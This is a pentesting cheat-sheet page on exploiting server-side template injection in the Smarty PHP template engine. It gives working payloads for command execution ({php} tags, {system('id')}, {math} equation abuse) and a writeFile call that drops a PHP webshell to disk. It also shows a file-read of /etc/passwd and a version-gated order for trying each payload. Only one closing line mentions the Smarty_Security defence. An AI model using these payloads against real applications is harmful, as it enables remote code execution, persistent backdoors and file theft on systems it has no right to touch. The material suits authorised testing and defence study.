---
title: "Smarty server-side template injection"
description: "Exploiting Smarty SSTI: confirming with {$smarty.version}, the {php} tag, static-method calls, and the self::getStreamVariable file-read path, with version gating."
keywords:
  - Smarty SSTI
  - php tag
  - static method call
  - self getStreamVariable
---

# Smarty

Smarty uses single-brace delimiters, so the probe is `{$smarty.version}`, which echoes the engine version, rather than `{7*7}`. Smarty exposes PHP more directly than Twig, but the available constructs depend heavily on version.

The oldest and most direct route is the `{php}` tag, which runs raw PHP:

```smarty
{php}system('id');{/php}
```

`{php}` was deprecated in Smarty 3 and removed/disabled by default in later 3.1.x, so it works only on older installations or where `$smarty->allow_php_tag` is enabled.

When `{php}` is unavailable, Smarty's expression syntax can call PHP static methods and functions. Smarty 3 allows calling registered PHP functions and, in many configurations, arbitrary static calls:

```smarty
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```

The `writeFile` static-method form drops a PHP webshell to disk, turning the injection into persistent RCE when the document root is writable. The `self::getStreamVariable` method was usable on some versions to read arbitrary files:

```smarty
{self::getStreamVariable("file:///etc/passwd")}
```

Smarty's `{math}` function historically evaluated its `equation` attribute through PHP and was another execution primitive (`{math equation="system('id')"}` style abuse), tightened in later releases.

Because behavior is version-dependent, confirm the version first with `{$smarty.version}`, then try `{php}`, the static-method calls, and the `{math}`/`writeFile` primitives in turn. When Smarty's `Smarty_Security` policy is enabled (`enableSecurity()`), PHP functions and static calls are whitelisted and these primitives are blocked, leaving variable disclosure as the remaining impact.

## Tools

- tplmap, SSTImap

## References

- Smarty documentation: {php}, security policy, registered functions
- PortSwigger Web Security Academy: Server-side template injection
